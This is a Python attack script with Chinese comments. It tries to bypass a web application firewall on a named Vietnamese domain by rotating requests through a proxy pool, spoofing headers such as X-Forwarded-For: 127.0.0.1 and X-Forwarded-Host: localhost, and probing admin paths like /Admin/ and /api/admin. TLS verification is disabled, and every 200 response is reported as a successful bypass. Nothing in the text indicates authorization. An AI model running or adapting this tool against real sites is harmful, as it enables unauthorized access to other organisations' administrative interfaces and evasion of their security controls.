#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

# 代理池（示例，实际使用真实代理）
PROXY_POOL = [
    "http://proxy1:port",
    "http://proxy2:port",
    # ... 添加真实代理
]

def test_with_proxy(url, proxy, headers=None):
    """使用代理测试"""
    try:
        proxies = {"http": proxy, "https": proxy}
        r = requests.get(url, proxies=proxies, headers=headers, verify=False, timeout=10)
        return {
            'proxy': proxy,
            'status': r.status_code,
            'success': True
        }
    except:
        return {
            'proxy': proxy,
            'success': False
        }

def bypass_waf_with_proxy(url, path):
    """使用代理池绕过WAF"""
    print(f"[*] 代理池绕过测试: {path}")
    
    headers_list = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"User-Agent": "Mozilla/5.0"},
        {"X-Forwarded-Host": "localhost"},
    ]
    
    results = []
    for proxy in PROXY_POOL[:10]:  # 使用前10个代理
        for headers in headers_list:
            result = test_with_proxy(f"{url}{path}", proxy, headers)
            if result['success'] and result['status'] == 200:
                results.append(result)
                print(f"[+] Bypass成功: {proxy} -> {path}")
    
    return results

if __name__ == "__main__":
    url = "https://emsone.com.vn"
    test_paths = ["/Admin/", "/api/admin", "/manager/"]
    
    for path in test_paths:
        bypass_waf_with_proxy(url, path)